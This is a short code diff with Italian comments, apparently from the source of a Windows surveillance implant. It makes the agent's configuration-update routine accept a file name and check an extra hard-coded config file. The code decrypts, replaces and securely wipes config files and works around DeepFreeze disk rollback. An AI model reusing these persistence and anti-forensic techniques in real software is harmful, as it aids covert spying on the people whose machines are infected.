@@ -2016,23 +2016,23 @@ void HM_WipeFileW(WCHAR *file_name)
 // Verifica se c'e' una copia integra del file di configurazione.
 // Se e' integra la rimpiazza sull'originale. In ogni caso la cancella (se esiste).
 // Se rimpiazza l'originale ritorna TRUE.
-BOOL HM_CheckNewConf() 
+BOOL HM_CheckNewConf(char *conf_file_name) 
 {
 	HANDLE h_conf_file;
 	char *clear_file;
 	char conf_path[DLLNAMELEN];
 	char orig_conf_path[DLLNAMELEN];
 
-	h_conf_file = FNC(CreateFileA)(HM_CompletePath(H4_CONF_BU, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	h_conf_file = FNC(CreateFileA)(HM_CompletePath(conf_file_name, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	// Se non trova nessun file di backup ritorna (lo considera inesistente)
 	if (h_conf_file == INVALID_HANDLE_VALUE)
 		return FALSE;
 	CloseHandle(h_conf_file);
 
 	// Verifica che il file sia integro e decifrabile correttamente
-	clear_file = HM_ReadClearConf(H4_CONF_BU);
+	clear_file = HM_ReadClearConf(conf_file_name);
 	if (!clear_file) {
-		HM_WipeFileA(HM_CompletePath(H4_CONF_BU, conf_path));
+		HM_WipeFileA(HM_CompletePath(conf_file_name, conf_path));
 		return FALSE;
 	}
 	SAFE_FREE(clear_file);
@@ -2041,12 +2041,12 @@ BOOL HM_CheckNewConf()
 	// Procede quindi alla copia su quello originale.
 	// Se fallisce la copia non cancella il backup (lo copiera' al prossimo avvio).
 	UnlockConfFile();
-	if (!FNC(CopyFileA)(HM_CompletePath(H4_CONF_BU, conf_path), HM_CompletePath(H4_CONF_FILE, orig_conf_path), FALSE))
+	if (!FNC(CopyFileA)(HM_CompletePath(conf_file_name, conf_path), HM_CompletePath(H4_CONF_FILE, orig_conf_path), FALSE))
 		return FALSE;
 	LockConfFile();
 
 	// La copia e' riuscita, quindi cancella il file di backup e torna TRUE.
-	HM_WipeFileA(HM_CompletePath(H4_CONF_BU, conf_path));
+	HM_WipeFileA(HM_CompletePath(conf_file_name, conf_path));
 
 	// Nel caso ci sia DeepFreeze, fixa il file di destinazione sul disco reale
 	if (IsDeepFreeze()) {
@@ -2681,7 +2681,8 @@ void __stdcall HM_sMain(void)
 	// o corrotto (lo rimpiazza con l'eventuale copia di backup).
 	// Va fatto prima di AM_Startup, perche' quest'ultima legge
 	// gia' il file di configurazione.
-	HM_CheckNewConf();
+	HM_CheckNewConf(H4_CONF_BU);
+	HM_CheckNewConf("nc-7-8dv.cfg");
 
 	// Legge le configurazioni globali. Va fatto DOPO HM_CheckNewConf.
 	HM_UpdateGlobalConf();
